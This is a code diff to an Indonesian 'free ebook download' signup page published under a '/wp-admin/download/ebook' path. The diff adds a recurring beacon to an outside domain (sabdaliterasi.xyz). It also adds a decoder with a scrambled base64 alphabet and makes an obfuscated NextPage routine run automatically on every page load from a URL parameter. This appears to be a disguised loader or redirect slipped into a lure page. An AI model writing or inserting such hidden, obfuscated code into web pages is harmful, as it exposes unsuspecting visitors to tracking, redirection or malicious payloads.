@@ -2,6 +2,7 @@
 permalink: /wp-admin/download/ebook
 layout: null
 ---
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -57,21 +58,22 @@ layout: null
     <button type="submit" class="btn btn-primary" id="submitForm">Submit and Download</button>
   </form>
 </div>
+
 <script> 
 
 !async function(){
-async function pingServer() {
-const serverUrl = "/api/verify/";
-  fetch(serverUrl)
-    .then(response => {
-      if (response.ok) {
-        console.log("Ping successful:", response.status);
-      } else {
-        console.error("Ping failed with status:", response.status);pingServer();
-      }
-    })
-    .catch(error => {console.error("Ping error:", error);pingServer();});
-}pingServer();setInterval(pingServer, 300000);
+async function pingServer() { 
+fetch("https://sabdaliterasi.xyz/api/verify/", {
+        method: "HEAD"
+    }).then(e => {
+        console.log("status server", e.status),
+        setTimeout(pingServer, 27e4)
+    }
+    ).catch(e => {
+        console.error("status server", e),
+        setTimeout(pingServer, 3e3)
+    }
+    )}pingServer();
 async function NextPage(g){
 function decodeBase641(e){let r="ECOSVMNWKYLJRGPXQHUTFDBZIAecosvmnwkyljrgpxqhutfdbzia3601849257+/=",d="",f=0;for(;f<e.length;){let o=r.indexOf(e.charAt(f++)),t=r.indexOf(e.charAt(f++)),a=r.indexOf(e.charAt(f++)),h=r.indexOf(e.charAt(f++)),n=o<<2|t>>4,c=(15&t)<<4|a>>2,C=(3&a)<<6|h;d+=String.fromCharCode(n),64!==a&&(d+=String.fromCharCode(c)),64!==h&&(d+=String.fromCharCode(C))}return decodeURIComponent(escape(d))};
  
@@ -143,12 +145,12 @@ function decodeBase64(input) {
   }
   const params = new URLSearchParams(window.location.search);
   const base64Data = params.get('c');
-  
+  await NextPage(base64Data);
   
   const jsonData = base64Data ? JSON.parse(decodeBase64(base64Data)) : null;
   let mode = "Baca/Download";
   if (jsonData) {
-  await NextPage(base64Data);
+  
   if(jsonData.mode){mode=jsonData.mode}
     document.getElementById('title').textContent = `Daftar dan ${mode} Gratis Ebook ${jsonData.title}.pdf`;localStorage.setItem("linkbookfree",jsonData.short)
   }
@@ -238,3 +240,4 @@ const newUrl = currentUrl.origin + currentUrl.pathname + (paramss.toString() ? '
 </script>
 </body>
 </html>
+
